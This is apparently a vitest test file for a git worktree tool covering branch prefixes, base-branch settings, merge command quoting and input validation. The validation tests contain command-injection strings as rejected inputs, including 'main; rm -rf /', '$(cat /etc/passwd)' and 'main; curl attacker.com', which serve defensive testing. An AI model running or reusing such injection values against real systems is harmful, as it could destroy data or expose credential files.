/**
 * Tests for configurable base branch and branch prefix features.
 *
 * Test plan:
 * 1. baseBranch setting: worktrees branch from configured base regardless of current checkout
 * 2. branchPrefix setting: branch is prefixed but worktree dir uses unprefixed slug
 * 3. Merge and close operations work correctly with prefixed branches
 * 4. Orphaned worktree discovery works with prefixed panes
 * 5. Settings API rejects invalid characters in baseBranch/branchPrefix
 * 6. Nonexistent baseBranch shows clear error
 */

import { describe, it, expect, vi, beforeEach } from 'vitest';
import { getPaneBranchName, isValidBranchName, isValidFullBranchName } from '../src/utils/git.js';

// ─── Test 1 & 2: getPaneBranchName, slug/branchName separation ───

describe('getPaneBranchName', () => {
  it('returns branchName when set', () => {
    const pane = {
      id: 'dmux-1', slug: 'fix-auth', branchName: 'feat/fix-auth',
      prompt: 'test', paneId: '%1',
    };
    expect(getPaneBranchName(pane)).toBe('feat/fix-auth');
  });

  it('falls back to slug when branchName is not set', () => {
    const pane = {
      id: 'dmux-1', slug: 'fix-auth',
      prompt: 'test', paneId: '%1',
    };
    expect(getPaneBranchName(pane)).toBe('fix-auth');
  });

  it('falls back to slug when branchName is undefined', () => {
    const pane = {
      id: 'dmux-1', slug: 'fix-auth', branchName: undefined,
      prompt: 'test', paneId: '%1',
    };
    expect(getPaneBranchName(pane)).toBe('fix-auth');
  });
});

// ─── Test 5: Input validation ───

describe('isValidBranchName', () => {
  it('accepts valid branch names', () => {
    expect(isValidBranchName('main')).toBe(true);
    expect(isValidBranchName('master')).toBe(true);
    expect(isValidBranchName('develop')).toBe(true);
    expect(isValidBranchName('feat/fix-auth')).toBe(true);
    expect(isValidBranchName('release/v2.0')).toBe(true);
    expect(isValidBranchName('user_branch-name.1')).toBe(true);
  });

  it('accepts empty string (means "not set")', () => {
    expect(isValidBranchName('')).toBe(true);
  });

  it('rejects branch names with shell metacharacters', () => {
    expect(isValidBranchName('main; rm -rf /')).toBe(false);
    expect(isValidBranchName('$(whoami)')).toBe(false);
    expect(isValidBranchName('`id`')).toBe(false);
    expect(isValidBranchName("branch'name")).toBe(false);
    expect(isValidBranchName('branch"name')).toBe(false);
    expect(isValidBranchName('branch name')).toBe(false);
    expect(isValidBranchName('branch|name')).toBe(false);
    expect(isValidBranchName('branch&name')).toBe(false);
    expect(isValidBranchName('branch>name')).toBe(false);
  });

  it('rejects common injection patterns', () => {
    expect(isValidBranchName('main; curl attacker.com')).toBe(false);
    expect(isValidBranchName('$(cat /etc/passwd)')).toBe(false);
    expect(isValidBranchName('main && echo pwned')).toBe(false);
  });

  it('rejects path traversal sequences', () => {
    expect(isValidBranchName('../main')).toBe(false);
    expect(isValidBranchName('refs/../../etc')).toBe(false);
    expect(isValidBranchName('foo/../bar')).toBe(false);
    expect(isValidBranchName('..')).toBe(false);
  });
});

describe('isValidFullBranchName', () => {
  it('accepts complete branch names', () => {
    expect(isValidFullBranchName('main')).toBe(true);
    expect(isValidFullBranchName('feat/fix-auth')).toBe(true);
    expect(isValidFullBranchName('release/2026.02')).toBe(true);
  });

  it('rejects prefixes and path-like edge cases', () => {
    expect(isValidFullBranchName('feat/')).toBe(false);
    expect(isValidFullBranchName('.')).toBe(false);
    expect(isValidFullBranchName('.hidden')).toBe(false);
    expect(isValidFullBranchName('refs/heads.lock')).toBe(false);
    expect(isValidFullBranchName('-bad')).toBe(false);
  });
});

// ─── Test 5: Settings validation at write time ───

describe('SettingsManager validation', () => {
  beforeEach(() => {
    vi.resetModules();
  });

  it('rejects invalid baseBranch values', async () => {
    vi.mock('fs', async (importOriginal) => {
      const actual = await importOriginal<typeof import('fs')>();
      return { ...actual, existsSync: vi.fn(() => false), writeFileSync: vi.fn(), mkdirSync: vi.fn() };
    });

    const { SettingsManager } = await import('../src/utils/settingsManager.js');
    const manager = new SettingsManager('/tmp/test-project');

    expect(() => manager.updateSetting('baseBranch', 'main; rm -rf /', 'global')).toThrow('Invalid baseBranch');
    expect(() => manager.updateSetting('baseBranch', '$(whoami)', 'global')).toThrow('Invalid baseBranch');
  });

  it('rejects invalid branchPrefix values', async () => {
    vi.mock('fs', async (importOriginal) => {
      const actual = await importOriginal<typeof import('fs')>();
      return { ...actual, existsSync: vi.fn(() => false), writeFileSync: vi.fn(), mkdirSync: vi.fn() };
    });

    const { SettingsManager } = await import('../src/utils/settingsManager.js');
    const manager = new SettingsManager('/tmp/test-project');

    expect(() => manager.updateSetting('branchPrefix', '`id`/', 'global')).toThrow('Invalid branchPrefix');
    expect(() => manager.updateSetting('branchPrefix', 'feat && echo pwned/', 'project')).toThrow('Invalid branchPrefix');
  });

  it('accepts valid baseBranch and branchPrefix values', async () => {
    vi.mock('fs', async (importOriginal) => {
      const actual = await importOriginal<typeof import('fs')>();
      return { ...actual, existsSync: vi.fn(() => false), writeFileSync: vi.fn(), mkdirSync: vi.fn() };
    });

    const { SettingsManager } = await import('../src/utils/settingsManager.js');
    const manager = new SettingsManager('/tmp/test-project');

    expect(() => manager.updateSetting('baseBranch', 'main', 'global')).not.toThrow();
    expect(() => manager.updateSetting('baseBranch', 'develop', 'global')).not.toThrow();
    expect(() => manager.updateSetting('baseBranch', '', 'global')).not.toThrow();
    expect(() => manager.updateSetting('branchPrefix', 'feat/', 'global')).not.toThrow();
    expect(() => manager.updateSetting('branchPrefix', 'fix/', 'project')).not.toThrow();
    expect(() => manager.updateSetting('branchPrefix', '', 'global')).not.toThrow();
  });
});

// ─── Test 2: Slug vs branchName separation ───

describe('slug and branchName separation', () => {
  it('slug stays filesystem-safe, branchName includes prefix', () => {
    const branchPrefix = 'feat/';
    const slug = 'fix-auth';
    const branchName = branchPrefix ? `${branchPrefix}${slug}` : slug;

    expect(slug).toBe('fix-auth');
    expect(branchName).toBe('feat/fix-auth');
    expect(slug).not.toContain('/');
  });

  it('worktree path uses slug, not branchName', () => {
    const projectRoot = '/home/user/project';
    const slug = 'fix-auth';
    const worktreePath = `${projectRoot}/.dmux/worktrees/${slug}`;

    expect(worktreePath).toBe('/home/user/project/.dmux/worktrees/fix-auth');
    expect(worktreePath.split('/').pop()).toBe('fix-auth');
  });

  it('branchName stored on pane only when different from slug', () => {
    const slug = 'fix-auth';

    // With prefix: branchName is stored
    const withPrefix = 'feat/fix-auth' !== slug ? 'feat/fix-auth' : undefined;
    expect(withPrefix).toBe('feat/fix-auth');

    // Without prefix: branchName is not stored
    const noPrefix = 'fix-auth' !== slug ? 'fix-auth' : undefined;
    expect(noPrefix).toBeUndefined();
  });
});

// ─── Test 3: Merge operations quote branch names ───

describe('merge operations quote branch names', () => {
  beforeEach(() => {
    vi.resetModules();
  });

  it('mergeWorktreeIntoMain quotes branch name', async () => {
    vi.mock('child_process', () => ({
      execSync: vi.fn().mockReturnValue(Buffer.from('')),
    }));

    const { mergeWorktreeIntoMain } = await import('../src/utils/mergeExecution.js');
    const { execSync } = await import('child_process');

    mergeWorktreeIntoMain('/test/repo', 'feat/fix-auth');

    expect(execSync).toHaveBeenCalledWith(
      'git merge "feat/fix-auth" --no-edit',
      expect.any(Object)
    );
  });

  it('mergeMainIntoWorktree quotes branch name', async () => {
    vi.mock('child_process', () => ({
      execSync: vi.fn().mockReturnValue(Buffer.from('')),
    }));

    const { mergeMainIntoWorktree } = await import('../src/utils/mergeExecution.js');
    const { execSync } = await import('child_process');

    mergeMainIntoWorktree('/test/worktree', 'main');

    expect(execSync).toHaveBeenCalledWith(
      'git merge "main" --no-edit',
      expect.any(Object)
    );
  });

  it('cleanupAfterMerge quotes branch name in git branch -d', async () => {
    vi.mock('child_process', () => ({
      execSync: vi.fn().mockReturnValue(Buffer.from('')),
    }));

    const { cleanupAfterMerge } = await import('../src/utils/mergeExecution.js');
    const { execSync } = await import('child_process');

    cleanupAfterMerge('/test/repo', '/test/worktree', 'feat/fix-auth');

    expect(execSync).toHaveBeenCalledWith(
      'git branch -d "feat/fix-auth"',
      expect.any(Object)
    );
  });
});

// ─── Test 4: Orphaned worktree discovery with prefixed panes ───

describe('orphaned worktree discovery with prefixed panes', () => {
  it('directory name matches slug (not branchName), so discovery works', () => {
    const activePanes = [
      { slug: 'fix-auth', branchName: 'feat/fix-auth' },
      { slug: 'add-tests', branchName: 'chore/add-tests' },
    ];
    const activeSlugs = activePanes.map(p => p.slug);
    const directoryEntries = ['fix-auth', 'add-tests', 'old-orphan'];

    const orphaned = directoryEntries.filter(name => !activeSlugs.includes(name));

    expect(orphaned).toEqual(['old-orphan']);
    expect(activeSlugs).toContain('fix-auth');
    expect(activeSlugs).toContain('add-tests');
  });

  it('prefixed branchName would NOT match directory entries (proving slug is needed)', () => {
    const activeBranchNames = ['feat/fix-auth', 'chore/add-tests'];
    const directoryEntries = ['fix-auth', 'add-tests'];

    const matched = directoryEntries.filter(name => activeBranchNames.includes(name));
    expect(matched).toHaveLength(0); // None match — everything wrongly "orphaned"
  });
});

// ─── Test 6: Nonexistent baseBranch error ───

describe('nonexistent baseBranch validation', () => {
  it('error message is clear and actionable', () => {
    // Simulates the error thrown in paneCreation.ts when baseBranch doesn't exist
    const baseBranch = 'nonexistent-branch';
    const errorMessage = `Base branch "${baseBranch}" does not exist. Update the baseBranch setting to a valid branch name.`;

    expect(errorMessage).toContain('nonexistent-branch');
    expect(errorMessage).toContain('does not exist');
    expect(errorMessage).toContain('Update the baseBranch setting');
  });
});

// ─── Test 1: baseBranch in git worktree add command ───

describe('baseBranch in worktree creation command', () => {
  it('produces correct command with baseBranch as start-point', () => {
    const worktreePath = '/project/.dmux/worktrees/fix-auth';
    const branchName = 'feat/fix-auth';
    const baseBranch = 'main';

    const startPoint = baseBranch ? ` "${baseBranch}"` : '';
    const cmd = `git worktree add "${worktreePath}" -b "${branchName}"${startPoint}`;

    expect(cmd).toBe('git worktree add "/project/.dmux/worktrees/fix-auth" -b "feat/fix-auth" "main"');
  });

  it('produces correct command without baseBranch (uses HEAD)', () => {
    const worktreePath = '/project/.dmux/worktrees/fix-auth';
    const branchName = 'fix-auth';
    const baseBranch = '';

    const startPoint = baseBranch ? ` "${baseBranch}"` : '';
    const cmd = `git worktree add "${worktreePath}" -b "${branchName}"${startPoint}`;

    expect(cmd).toBe('git worktree add "/project/.dmux/worktrees/fix-auth" -b "fix-auth"');
  });

  it('uses existing branch without -b flag when branch exists', () => {
    const worktreePath = '/project/.dmux/worktrees/fix-auth';
    const branchName = 'feat/fix-auth';

    const cmd = `git worktree add "${worktreePath}" "${branchName}"`;

    expect(cmd).toBe('git worktree add "/project/.dmux/worktrees/fix-auth" "feat/fix-auth"');
  });
});

// ─── DMUX_BRANCH hook env ───

describe('hooks environment uses branchName', () => {
  it('uses branchName when set', () => {
    const pane = { slug: 'fix-auth', branchName: 'feat/fix-auth', worktreePath: '/x' };
    expect(pane.branchName || pane.slug).toBe('feat/fix-auth');
  });

  it('falls back to slug when no branchName', () => {
    const pane: { slug: string; branchName?: string } = { slug: 'fix-auth' };
    expect(pane.branchName || pane.slug).toBe('fix-auth');
  });
});

// ─── Setting definitions ───

describe('setting definitions', () => {
  it('baseBranch is a text field for arbitrary branch names', async () => {
    const { SETTING_DEFINITIONS } = await import('../src/utils/settingsManager.js');
    const def = SETTING_DEFINITIONS.find(d => d.key === 'baseBranch');

    expect(def).toBeDefined();
    expect(def!.type).toBe('text');
  });

  it('branchPrefix has common prefix options', async () => {
    const { SETTING_DEFINITIONS } = await import('../src/utils/settingsManager.js');
    const def = SETTING_DEFINITIONS.find(d => d.key === 'branchPrefix');

    expect(def).toBeDefined();
    expect(def!.type).toBe('select');

    const values = def!.options!.map(o => o.value);
    expect(values).toContain('');
    expect(values).toContain('feat/');
    expect(values).toContain('fix/');
    expect(values).toContain('chore/');
  });

  it('maxPaneWidth is a bounded number setting', async () => {
    const { SETTING_DEFINITIONS } = await import('../src/utils/settingsManager.js');
    const def = SETTING_DEFINITIONS.find(d => d.key === 'maxPaneWidth');

    expect(def).toBeDefined();
    expect(def!.type).toBe('number');
    expect(def!.min).toBe(40);
    expect(def!.max).toBe(300);
    expect(def!.step).toBe(1);
    expect(def!.shiftStep).toBe(10);
  });

  it('minPaneWidth is a bounded number setting', async () => {
    const { SETTING_DEFINITIONS } = await import('../src/utils/settingsManager.js');
    const def = SETTING_DEFINITIONS.find(d => d.key === 'minPaneWidth');

    expect(def).toBeDefined();
    expect(def!.type).toBe('number');
    expect(def!.min).toBe(40);
    expect(def!.max).toBe(300);
    expect(def!.step).toBe(1);
    expect(def!.shiftStep).toBe(10);
  });

  it('showFooterTips is a boolean setting', async () => {
    const { SETTING_DEFINITIONS } = await import('../src/utils/settingsManager.js');
    const def = SETTING_DEFINITIONS.find(d => d.key === 'showFooterTips');

    expect(def).toBeDefined();
    expect(def!.type).toBe('boolean');
  });
});
